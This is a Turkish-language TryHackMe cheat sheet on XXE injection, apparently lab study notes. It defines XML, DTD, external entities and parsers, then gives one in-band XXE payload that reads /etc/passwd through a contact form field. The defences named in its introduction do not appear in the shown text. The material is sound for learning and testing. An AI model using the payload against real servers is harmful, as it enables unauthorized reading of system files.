# TryHackMe: XXE (XML External Entity) Injection - Cheat Sheet

Bu belge, web uygulamalarındaki XML ayrıştırıcı (parser) zafiyetlerini kullanarak gerçekleştirilen XXE saldırılarını, SSRF kombinasyonlarını ve savunma yöntemlerini özetler.

## 🧠 1. Temel Kavramlar ve Terminoloji
* **XML:** Verileri etiketler (tag) arasında taşıyan SGML tabanlı işaretleme dili.
* **DTD (Document Type Definition):** XML belgesinin yapısını ve izin verilen kuralları tanımlar.
* **Entities (Varlıklar):** XML içindeki değişkenlerdir. XXE saldırılarının kalbi **External (Harici) Entities**'dir. `SYSTEM` anahtar kelimesi ile dışarıdan dosya veya URL çağırabilirler.
* **XML Parser (Ayrıştırıcı):** XML kodunu okuyup işleyen yazılımdır (Örn: DOM, SAX). Zafiyet, bu parser'ların "Dış Varlıkları" (External Entities) okumaya açık bırakılmasından doğar.

---

## 💥 2. XXE Saldırı Vektörleri ve Payloadlar

### A. In-Band XXE (Local File Disclosure / LFI)
Sunucunun çaldığımız veriyi doğrudan ekranda veya HTTP yanıtında gösterdiği durumdur.
* **Amaç:** Sunucudaki gizli dosyaları (örn: `/etc/passwd`) okumak.
* **Payload:**
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<contact>
   <name>&xxe;</name> <email>test@test.com</email>
</contact>
